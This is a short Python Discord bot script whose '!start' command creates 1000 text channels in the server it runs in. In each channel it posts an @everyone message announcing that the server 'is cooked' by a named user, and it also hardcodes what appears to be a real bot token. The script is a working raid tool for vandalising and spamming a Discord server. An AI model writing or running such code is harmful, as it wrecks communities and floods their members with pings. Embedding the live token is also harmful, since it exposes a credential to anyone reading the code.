import discord
from discord.ext import commands

TOKEN = "MTQwOTYxNTE0MTA1NzU5MzU1Ng.GyZHln.8itXnpwFtfKIhyRfeYWwiuUTWIuR8Jg0ZV0_BY"

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot Logined as {bot.user}")

@bot.command()
async def start(ctx):
    guild = ctx.guild
    for i in range(1000):
        channel = await guild.create_text_channel(f"server-cooked-{i+1}")
        await channel.send("@everyone this server is cooked :skull: by @johanxq4")

    
bot.run(TOKEN)

